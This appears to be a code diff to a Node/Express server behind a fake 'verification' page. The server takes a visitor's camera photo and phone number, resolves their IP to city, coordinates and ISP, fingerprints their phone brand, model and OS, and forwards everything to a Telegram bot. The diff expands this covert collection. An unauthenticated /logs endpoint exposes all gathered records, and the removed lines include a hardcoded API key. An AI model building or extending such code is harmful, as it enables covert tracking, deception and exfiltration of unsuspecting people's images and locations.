@@ -14,54 +14,148 @@ console.log('========================================');
 console.log('🚀 SERVER STARTING');
 console.log('========================================');
 console.log(`🤖 BOT_TOKEN: ${BOT_TOKEN ? '✅ SET' : '❌ NOT SET'}`);
-console.log(`🤖 Token: ${BOT_TOKEN ? BOT_TOKEN.substring(0, 15) + '...' : 'NULL'}`);
 console.log(`📱 CHAT_ID: ${CHAT_ID ? '✅ SET' : '❌ NOT SET'}`);
-console.log(`📱 Chat ID: ${CHAT_ID}`);
 console.log(`🌐 PORT: ${PORT}`);
 console.log('========================================');
-
-// Test koneksi ke Telegram saat start
-async function testTelegramConnection() {
-  try {
-    console.log('🔍 Testing Telegram connection...');
-    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
-    const data = await response.json();
-    if (data.ok) {
-      console.log('✅ Telegram connection: SUCCESS');
-      console.log(`🤖 Bot username: @${data.result.username}`);
-    } else {
-      console.log('❌ Telegram connection: FAILED');
-      console.log(`❌ Error: ${data.description}`);
-    }
-  } catch (err) {
-    console.log('❌ Telegram connection: ERROR');
-    console.log(`❌ ${err.message}`);
-  }
-}
-testTelegramConnection();
 
 app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use(express.static('public'));
 
-// Database sederhana
+// Database
 const db = [];
 
-// ===== GET LOCATION AKURAT =====
+// ===== DETEKSI DEVICE DARI USER-AGENT =====
+function detectDevice(userAgent) {
+  if (!userAgent) return 'Tidak diketahui';
+  
+  const ua = userAgent.toLowerCase();
+  let device = {
+    browser: 'Tidak diketahui',
+    os: 'Tidak diketahui',
+    device: 'Tidak diketahui',
+    brand: 'Tidak diketahui',
+    model: 'Tidak diketahui'
+  };
+  
+  // Deteksi Browser
+  if (ua.includes('chrome')) device.browser = 'Chrome';
+  else if (ua.includes('firefox')) device.browser = 'Firefox';
+  else if (ua.includes('safari')) device.browser = 'Safari';
+  else if (ua.includes('edge')) device.browser = 'Edge';
+  else if (ua.includes('opera')) device.browser = 'Opera';
+  else if (ua.includes('ucbrowser')) device.browser = 'UC Browser';
+  else if (ua.includes('miui')) device.browser = 'Mi Browser';
+  
+  // Deteksi OS
+  if (ua.includes('android')) {
+    device.os = 'Android';
+    // Deteksi versi Android
+    const androidMatch = ua.match(/android\s([\d.]+)/);
+    if (androidMatch) device.os += ` ${androidMatch[1]}`;
+  } else if (ua.includes('ios') || ua.includes('iphone') || ua.includes('ipad')) {
+    device.os = 'iOS';
+    const iosMatch = ua.match(/os\s([\d_]+)/);
+    if (iosMatch) device.os += ` ${iosMatch[1].replace(/_/g, '.')}`;
+  } else if (ua.includes('windows')) {
+    device.os = 'Windows';
+    if (ua.includes('windows nt 10.0')) device.os += ' 10';
+    else if (ua.includes('windows nt 6.3')) device.os += ' 8.1';
+    else if (ua.includes('windows nt 6.2')) device.os += ' 8';
+    else if (ua.includes('windows nt 6.1')) device.os += ' 7';
+  } else if (ua.includes('mac')) {
+    device.os = 'macOS';
+  } else if (ua.includes('linux')) {
+    device.os = 'Linux';
+  }
+  
+  // Deteksi Tipe Device
+  if (ua.includes('mobile') || ua.includes('android') || ua.includes('iphone') || ua.includes('ipod')) {
+    device.device = 'Mobile';
+  } else if (ua.includes('tablet') || ua.includes('ipad')) {
+    device.device = 'Tablet';
+  } else {
+    device.device = 'Desktop';
+  }
+  
+  // Deteksi Brand HP
+  const brands = [
+    { name: 'Samsung', patterns: ['samsung', 'sm-'] },
+    { name: 'Xiaomi', patterns: ['xiaomi', 'mi ', 'redmi', 'poco'] },
+    { name: 'Realme', patterns: ['realme'] },
+    { name: 'Oppo', patterns: ['oppo'] },
+    { name: 'Vivo', patterns: ['vivo'] },
+    { name: 'OnePlus', patterns: ['oneplus'] },
+    { name: 'Google', patterns: ['pixel'] },
+    { name: 'Huawei', patterns: ['huawei', 'honor'] },
+    { name: 'Nokia', patterns: ['nokia'] },
+    { name: 'Sony', patterns: ['sony'] },
+    { name: 'LG', patterns: ['lg-'] },
+    { name: 'Asus', patterns: ['asus'] },
+    { name: 'Lenovo', patterns: ['lenovo'] },
+    { name: 'Infinix', patterns: ['infinix'] },
+    { name: 'Tecno', patterns: ['tecno'] }
+  ];
+  
+  for (const brand of brands) {
+    if (brand.patterns.some(p => ua.includes(p))) {
+      device.brand = brand.name;
+      break;
+    }
+  }
+  
+  // Deteksi Model (coba ambil dari user-agent)
+  if (device.brand === 'Samsung') {
+    const samsungMatch = ua.match(/sm-[a-z0-9]+/i);
+    if (samsungMatch) device.model = samsungMatch[0].toUpperCase();
+  } else if (device.brand === 'Xiaomi') {
+    const xiaomiMatch = ua.match(/mi\s[a-z0-9]+/i) || ua.match(/redmi\s[a-z0-9]+/i);
+    if (xiaomiMatch) device.model = xiaomiMatch[0];
+  } else if (device.brand === 'Realme') {
+    const realmeMatch = ua.match(/realme\s[a-z0-9]+/i);
+    if (realmeMatch) device.model = realmeMatch[0];
+  } else if (device.brand === 'Oppo') {
+    const oppoMatch = ua.match(/oppo\s[a-z0-9]+/i);
+    if (oppoMatch) device.model = oppoMatch[0];
+  } else if (device.brand === 'Vivo') {
+    const vivoMatch = ua.match(/vivo\s[a-z0-9]+/i);
+    if (vivoMatch) device.model = vivoMatch[0];
+  } else if (device.brand === 'Google') {
+    const pixelMatch = ua.match(/pixel\s[a-z0-9]+/i);
+    if (pixelMatch) device.model = pixelMatch[0];
+  }
+  
+  return device;
+}
+
+// ===== GET LOKASI AKURAT DARI IP =====
 async function getLocationDetails(ip) {
   try {
     const cleanIp = ip === '::1' ? '' : ip.split(',')[0].trim();
     if (!cleanIp) return null;
     
-    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query`);
+    console.log(`🔍 Getting location for IP: ${cleanIp}`);
+    
+    // Gunakan ip-api.com dengan lebih banyak field
+    const res = await fetch(`http://ip-api.com/json/${cleanIp}?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,mobile,proxy,hosting`);
     const data = await res.json();
     
+    console.log(`📍 Location API response:`, data.status);
+    
     if (data.status === 'success') {
+      // Deteksi apakah ini IP mobile
+      const isMobile = data.mobile || data.isp?.toLowerCase().includes('mobile') || data.isp?.toLowerCase().includes('cellular');
+      
+      // Deteksi provider
+      let provider = data.isp || data.org || 'Tidak diketahui';
+      if (provider.includes('PT ')) provider = provider.replace('PT ', '');
+      
       return {
         ip: data.query,
         country: data.country || '-',
         countryCode: data.countryCode || '-',
         region: data.regionName || '-',
+        regionCode: data.region || '-',
         city: data.city || '-',
         zip: data.zip || '-',
         latitude: data.lat || 0,
@@ -70,9 +164,15 @@ async function getLocationDetails(ip) {
         isp: data.isp || '-',
         org: data.org || '-',
         as: data.as || '-',
+        isMobile: isMobile || false,
+        isProxy: data.proxy || false,
+        isHosting: data.hosting || false,
+        provider: provider,
         fullLocation: `${data.city || '-'}, ${data.regionName || '-'}, ${data.country || '-'}`,
         googleMapsLink: `https://www.google.com/maps?q=${data.lat || 0},${data.lon || 0}`,
-        googleMapsEmbed: `https://www.google.com/maps/embed/v1/place?key=AIzaSyBFw0Qbyq9zTFTd-tUY6dZWTgaQzuU17R8&q=${data.lat || 0},${data.lon || 0}&zoom=15`
+        googleMapsShort: `https://maps.google.com/?q=${data.lat || 0},${data.lon || 0}`,
+        // Link untuk melihat di maps dengan lebih detail
+        googleMapsDetailed: `https://www.google.com/maps/place/${data.lat || 0},${data.lon || 0}/@${data.lat || 0},${data.lon || 0},15z`
       };
     }
     return null;
@@ -83,7 +183,7 @@ async function getLocationDetails(ip) {
 }
 
 // ===== SEND TO TELEGRAM =====
-async function sendToTelegram(photoBuffer, locationData, phone, ip) {
+async function sendToTelegram(photoBuffer, locationData, deviceData, phone, ip, userAgent) {
   try {
     const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
     
@@ -91,25 +191,42 @@ async function sendToTelegram(photoBuffer, locationData, phone, ip) {
     caption += `📱 *User:* ${phone || 'Tidak diketahui'}\n`;
     caption += `🕒 *Waktu:* ${timestamp}\n\n`;
     
+    // ===== INFO DEVICE =====
+    if (deviceData) {
+      caption += `📱 *Device Info:*\n`;
+      caption += `   📱 Tipe: ${deviceData.device}\n`;
+      caption += `   🏷️ Brand: ${deviceData.brand}\n`;
+      if (deviceData.model && deviceData.model !== 'Tidak diketahui') {
+        caption += `   📟 Model: ${deviceData.model}\n`;
+      }
+      caption += `   💻 OS: ${deviceData.os}\n`;
+      caption += `   🌐 Browser: ${deviceData.browser}\n\n`;
+    }
+    
+    // ===== LOKASI =====
     if (locationData) {
       caption += `📍 *Lokasi:*\n`;
       caption += `   🏙️ ${locationData.fullLocation}\n`;
       caption += `   📮 Zip: ${locationData.zip}\n`;
       caption += `   🌐 Timezone: ${locationData.timezone}\n`;
-      caption += `   📡 ISP: ${locationData.isp}\n\n`;
+      caption += `   📡 Provider: ${locationData.provider}\n`;
       
-      caption += `🗺️ *Google Maps:*\n`;
-      caption += `${locationData.googleMapsLink}\n\n`;
+      if (locationData.isMobile) {
+        caption += `   📱 IP Mobile: Ya\n`;
+      }
+      
+      caption += `\n🗺️ *Google Maps:*\n`;
+      caption += `${locationData.googleMapsDetailed}\n\n`;
       
       caption += `📊 *Koordinat:*\n`;
       caption += `   ${locationData.latitude}, ${locationData.longitude}\n\n`;
     }
     
+    // ===== IP =====
     caption += `🌐 *IP:* ${ip || 'Tidak diketahui'}\n`;
     caption += `_Foto diterima untuk verifikasi_`;
 
     console.log('📤 Sending to Telegram...');
-    console.log(`📱 Chat ID: ${CHAT_ID}`);
     console.log(`📸 Photo size: ${photoBuffer.length} bytes`);
 
     const form = new FormData();
@@ -182,6 +299,7 @@ app.post('/webhook', async (req, res) => {
         response += `${index + 1}. 📱 ${user.phone || 'User'}\n`;
         response += `   🕒 ${user.timestamp}\n`;
         response += `   📍 ${user.location || 'Tidak diketahui'}\n`;
+        response += `   📱 ${user.device || 'Tidak diketahui'}\n`;
         if (index < lastIndex) response += `\n`;
       });
       
@@ -219,34 +337,45 @@ app.post('/verify', async (req, res) => {
       return res.json({ success: false, error: 'No image' });
     }
     
-    // Get IP
+    // Get IP dan User Agent
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+    const userAgent = req.headers['user-agent'] || '';
+    
     console.log(`🌐 IP: ${ip}`);
+    console.log(`📱 User-Agent: ${userAgent.substring(0, 100)}...`);
     
     // Get location details
     const locationData = await getLocationDetails(ip);
     console.log(`📍 Location:`, locationData ? locationData.fullLocation : 'Not found');
+    
+    // Detect device
+    const deviceData = detectDevice(userAgent);
+    console.log(`📱 Device:`, deviceData);
     
     // Process image
     const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
     const buffer = Buffer.from(base64Data, 'base64');
     console.log(`📸 Image size: ${buffer.length} bytes`);
     
-    // Save to database
+    // Simpan ke database
     const userData = {
       phone: phone || `User_${Date.now().toString().slice(-6)}`,
       timestamp: new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }),
       location: locationData ? locationData.fullLocation : 'Tidak diketahui',
+      device: deviceData ? `${deviceData.brand} ${deviceData.model}`.trim() || deviceData.device : 'Tidak diketahui',
       ip: ip,
       latitude: locationData ? locationData.latitude : 0,
       longitude: locationData ? locationData.longitude : 0,
-      googleMaps: locationData ? locationData.googleMapsLink : '-'
+      googleMaps: locationData ? locationData.googleMapsLink : '-',
+      provider: locationData ? locationData.provider : '-',
+      os: deviceData ? deviceData.os : '-',
+      browser: deviceData ? deviceData.browser : '-'
     };
     db.push(userData);
     console.log('💾 Data saved');
     
     // Send to Telegram
-    const result = await sendToTelegram(buffer, locationData, phone, ip);
+    const result = await sendToTelegram(buffer, locationData, deviceData, phone, ip, userAgent);
     
     if (result && result.ok) {
       console.log('✅ Success!');
@@ -267,7 +396,6 @@ app.get('/test', async (req, res) => {
   try {
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getMe`);
     const data = await response.json();
-    console.log('🧪 Test endpoint hit');
     res.json(data);
   } catch (err) {
     res.json({ error: err.message });
@@ -276,7 +404,6 @@ app.get('/test', async (req, res) => {
 
 app.get('/send', async (req, res) => {
   try {
-    console.log('🧪 Testing send message...');
     const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
@@ -286,7 +413,6 @@ app.get('/send', async (req, res) => {
       })
     });
     const data = await response.json();
-    console.log('📨 Send test result:', data.ok ? '✅ Success' : '❌ Failed');
     res.json(data);
   } catch (err) {
     res.json({ error: err.message });
@@ -296,9 +422,7 @@ app.get('/send', async (req, res) => {
 app.get('/logs', (req, res) => {
   res.json({ 
     totalUsers: db.length,
-    users: db,
-    botToken: BOT_TOKEN ? '✅ SET' : '❌ NOT SET',
-    chatId: CHAT_ID ? '✅ SET' : '❌ NOT SET'
+    users: db
   });
 });
 
@@ -309,8 +433,5 @@ app.get('/', (req, res) => {
 app.listen(PORT, '0.0.0.0', () => {
   console.log('========================================');
   console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📊 Test bot: /test`);
-  console.log(`📊 Test send: /send`);
-  console.log(`📊 View logs: /logs`);
   console.log('========================================');
 });
